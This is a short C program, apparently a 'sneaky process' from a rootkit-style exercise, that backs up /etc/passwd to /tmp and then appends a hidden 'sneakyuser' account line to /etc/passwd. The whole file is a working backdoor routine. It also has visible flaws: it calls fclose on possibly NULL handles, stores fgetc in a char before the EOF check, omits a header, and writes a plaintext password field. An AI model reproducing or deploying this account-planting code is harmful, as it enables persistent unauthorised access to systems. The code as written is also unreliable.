#include<stdio.h>
#include<stdlib.h>

void copyfile(){
  FILE *source, *destination;
  char ch;
  
  source = fopen("/etc/passwd", "r");
  destination = fopen("/tmp/passwd", "w");

  if(source == NULL || destination == NULL){
    fclose(source);
    fclose(destination);
    printf("Error while opening files\n");
    exit(EXIT_FAILURE);
  }
  
  while((ch = fgetc(source)) != EOF){
    fputc(ch, destination);
  }
  
  fclose(source);
  fclose(destination);
}

void addSneakyUser(){
  FILE *fp;

  fp = fopen("/etc/passwd", "a+");
  if(fp == NULL){
    printf("Error while opening the file to append");
    exit(EXIT_FAILURE);
  }

  fprintf(fp, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
  fclose(fp);
}

int main(int argc, char* argv[]){
  int current_pid = getpid();
  printf("sneaky_process pid = %d\n", current_pid);
  copyfile();
  addSneakyUser();
  return 0;
}
